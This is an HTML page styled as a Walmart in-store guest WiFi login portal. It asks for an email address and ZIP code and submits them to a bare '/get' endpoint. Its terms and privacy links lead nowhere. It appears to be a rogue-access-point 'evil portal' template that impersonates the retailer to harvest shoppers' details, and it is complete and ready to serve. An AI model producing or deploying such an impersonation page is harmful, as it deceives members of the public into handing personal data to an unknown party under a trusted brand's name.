<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0071CE;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.spark{font-size:48px;color:#FFC220;text-align:center;line-height:1;margin-bottom:4px}
.brand{font-size:26px;font-weight:900;color:#fff;text-align:center;letter-spacing:-0.5px;margin-bottom:6px}
.bsub{font-size:12px;color:rgba(255,255,255,0.7);text-align:center;font-weight:600;letter-spacing:1px;text-transform:uppercase;margin-bottom:24px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.2)}
.ch{background:#FFC220;padding:16px 24px}
.ch h1{font-size:16px;font-weight:800;color:#1a1a1a}.ch p{font-size:12px;color:#555;margin-top:2px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#0071CE;box-shadow:0 0 0 3px rgba(0,113,206,0.12)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11.5px;color:#888;margin-top:14px;margin-bottom:6px;line-height:1.5}.terms a{color:#0071CE}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#0071CE;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
.foot{background:#f7f9fb;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#0071CE;text-decoration:none}
</style>
</head>
<body>
<div class="spark">&#10022;</div>
<div class="brand">Walmart</div>
<div class="bsub">In-Store Free WiFi</div>
<div class="card">
  <div class="ch"><h1>Guest WiFi Access</h1><p>Free for all shoppers</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">ZIP Code</label>
      <input name="zip" type="text" placeholder="e.g. 68501" inputmode="numeric" maxlength="5">
      <p class="terms">By connecting you agree to Walmart's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
      <button type="submit" class="btn">Connect to WiFi</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Walmart Inc.</span><a href="#">Privacy</a></div>
</div>
</body>
</html>
